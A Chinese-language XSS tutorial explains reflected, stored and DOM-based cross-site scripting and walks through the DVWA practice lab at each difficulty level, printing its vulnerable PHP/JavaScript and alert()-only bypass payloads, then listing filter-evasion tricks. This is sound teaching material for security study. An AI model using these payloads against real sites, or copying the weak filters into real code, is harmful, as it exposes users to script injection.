# XSS(跨站脚本攻击)

## 前言

>XSS又叫CSS (Cross Site Script)，全称跨站脚本攻击。它指的是攻击者往Web页面或者URL里插入恶意JavaScript脚本代码，如果Web应用程序对于用户输入的内容没有过滤，那么当正常用户浏览该网页的时候，嵌入在Web页面里的恶意
>JavaScript脚本代码会被执行，从而达到恶意攻击正常用户的目的。


## 漏洞产生原因

网站对用户输入的数据没有做严格的过滤或验证，导致用户可以插入恶意的js代码，xss是客户端漏洞。

## 漏洞常见位置

数据交互的地方∶

- get post cookies headers方法-富文本编辑器
- 各类标签插入和自定义数据输出的地方:
- 用户资料
- 关键词、标签、说明

## 漏洞危害

- 窃取用户cookie
- 窃取浏览器信息
- xss劫持浏览器
- xss蠕虫(具有传播性)
- 键盘记录

## 漏洞检测方法

见框就插

- 输入敏感字符如<、>、"、'、()等，请求后查看源码字符是否被转义
- 有的无法得知输出位,后台管理员才能看到

工具

- Xsser、AWVS、Xray等常见web扫描器都能检测xss

## 漏洞分类

### 反射型

- 只在当前浏览器生效，并且是非持久性攻击

### 存储型

- xss被持久化存储在数据库中，危害最大

### DOM型

- DOM型也是反射型的一种
- DOM型只存在前端代码，用户传入的参数不和后端代码交互
- 接收和传入参数都是通过js处理而不是后端php代码处理

### 三种漏洞的区别

**存储型XSS和反射型XSS的区别**

- 存储型XSS恶意代码存在数据库中，反射型XSS在URL中

**DOM型与其他两种XSS区别**

- DOM型XSS攻击中，取出和指向恶意代码由浏览器端完成，属于前端js自身的安全漏洞，而其他两种都属于服务器端的安全漏洞

## 漏洞防御

- 将输入的字符串转换为html实体编码
- 关键词过滤

## DVWA靶场

**反射型**

- low

```php 
<?php
header ("X-XSS-Protection: 0");
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
?> 
```

    没有防护，直接输入XSS
    
    payload：<script>alert(/xss/)</script>

- medium

```php
<?php
header ("X-XSS-Protection: 0");
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
?>
```

    str_replace( '<script>', '', $_GET[ 'name' ] )替换<script>为空，双写绕过即可
    
    payload：<scr<script>ipt>alert(/xss/)</script>

- high

```php
<?php
header ("X-XSS-Protection: 0");
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
?>
```

    使用preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] )
    过滤<script，用其他标签平替即可
    
    payload：<img src=1 onerror=alert(/XSS/)>

- impossible

```php
<?php
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

// Generate Anti-CSRF token
generateSessionToken();
?>
```

    $name = htmlspecialchars( $_GET[ 'name' ] );
    将传入数据中的特殊字符转换成了html实体，无法传入任何标签

**存储型**

- low

```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}
?>
```

    trim()函数过滤空格、制表符、回车等空白字符
    
    message使用stripslashes()函数去掉反斜杠
    
    message使用mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符
    
    name使用mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符
    
    代码只防御了sql注入，直接输入xss语句会被存入数据库，其他用户再次访问这个页面就会被触发
    payload：<script>alert(/xss/)</script>

- medium

```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}
?>
```

    trim()函数过滤空格、制表符、回车等空白字符
    
    message使用stript_tags()函数过滤标签
    
    message使用mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符
    
    message使用htmlspecialchars()函数将特殊字符转化为html实体
    
    name使用str_replace()函数过滤<script>
    
    name使用mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符
    
    代码只防御了message，name可以使用双写绕过插入XSS，name被js限制的长度，直接删掉js中的maxlength即可
    payload：<sc<script>ript>alert(/xss/)</script>

- high

```PHP
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}
?>
```

    trim()函数过滤空格、制表符、回车等空白字符
    
    message使用addslashes()函数转义特殊字符
    
    message使用stript_tags()函数过滤标签
    
    message使用mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符
    
    message使用htmlspecialchars()函数将特殊字符转化为html实体
    
    name使用pred_replace()函数过滤字符<script
    
    name使用mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符
    
    此处无法使用<script>标签但可以使用其他标签平替,name被js限制的长度，直接删掉js中的maxlength即可
    
    payload：<img src=1 onerror=alert(/XSS/)>



- impossible

```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = stripslashes( $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $name = htmlspecialchars( $name );

    // Update database
    $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );
    $data->bindParam( ':message', $message, PDO::PARAM_STR );
    $data->bindParam( ':name', $name, PDO::PARAM_STR );
    $data->execute();
}

// Generate Anti-CSRF token
generateSessionToken();
?>
```

    trim()函数将传入的数据去掉空格，制表符，回车符等空白字符
    
    stripslashes()函数去掉反斜杠
    
    mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符
    
    htmlspecialchars()函数将特殊字符转化为html实体
    
    最后使用PDO预处理技术防御SQL注入  

**DOM型**

- low

```php
<?php

# No protections, anything goes

?>
```

```js
<script>
  if (document.location.href.indexOf("default=") >= 0) {
    var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
    document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
    document.write("<option value='' disabled='disabled'>----</option>");
    }
					    
    document.write("<option value='English'>English</option>");
    document.write("<option value='French'>French</option>"); 
    document.write("<option value='Spanish'>Spanish</option>");
    document.write("<option value='German'>German</option>");
</script>
```

    js接收参数后经过decodeURI进行url解码再原样输出
    payload：?default=<script>alert(/XSS/)</script>

- medium

```php
<?php
// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}
?>
```

```js
<select name="default">
  <script>
    if (document.location.href.indexOf("default=") >= 0) {
      var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
      document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
      document.write("<option value='' disabled='disabled'>----</option>");
    }
       
      document.write("<option value='English'>English</option>");
      document.write("<option value='French'>French</option>");
      document.write("<option value='Spanish'>Spanish</option>");
      document.write("<option value='German'>German</option>");
  </script>
</select>
```

    过滤了script标签，可以用img标签+onerror事件绕过
    传入的数据在select下拉选框中，需要先将select和option标签闭合
    payload：?default=English</opnion></select><img src=1 onerror=alert(/XSS/)>

- high

```php
<?php
// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}
?>
```

```js
<select name="default">
  <script>
    if (document.location.href.indexOf("default=") >= 0) {
      var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
      document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
      document.write("<option value='' disabled='disabled'>----</option>");
    }
       
      document.write("<option value='English'>English</option>");
      document.write("<option value='French'>French</option>");
      document.write("<option value='Spanish'>Spanish</option>");
      document.write("<option value='German'>German</option>");
  </script>
</select>
```

    后端代码用switch限制用户传入的参数必须是下拉菜单中的值，url中#后面的数据不会被传到后端
    payload：?default=English#<script>alert(\xss\)</script>

- impossible

```php
<?php

# Don't need to do anything, protection handled on the client side

?> 
```

```js
<select name="default">
  <script>
    if (document.location.href.indexOf("default=") >= 0) {
      var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
      document.write("<option value='" + lang + "'>" + (lang) + "</option>");
      document.write("<option value='' disabled='disabled'>----</option>");
    }
       
      document.write("<option value='English'>English</option>");
      document.write("<option value='French'>French</option>");
      document.write("<option value='Spanish'>Spanish</option>");
      document.write("<option value='German'>German</option>");
  </script>
</select>
```

    将js中的url解码函数去掉，通过url转入的数据输出的是url编码后的值，无法作为js解析

## XSS变形与绕过

#### 语句构造

- 伪协议绕过
  \<a>标签
  - <a\>标签href属性javascript伪协议>绕过htmlspecialchars转换html实体编码

```js
<a href='javascript:alert(/XSS/)链接</a>'
```

- 事件触发
  \<img>标签
    - \<onmoouse>
    - \<onerror>
    - \<onclick>
- \<input>标签
  - \<onkeydown>
- h5\<onfocus>事件
- 常见的还有Windows事件、Form事件、keyboard事件、mouse事件、Media事件

#### 绕过方法

  - 大小写
  - 引号
  - /代替空格
  - 加空格、回车和tab制表符也不影响js
  - 对标签转码，十进制编码、十六进制编码
  - 拆分跨站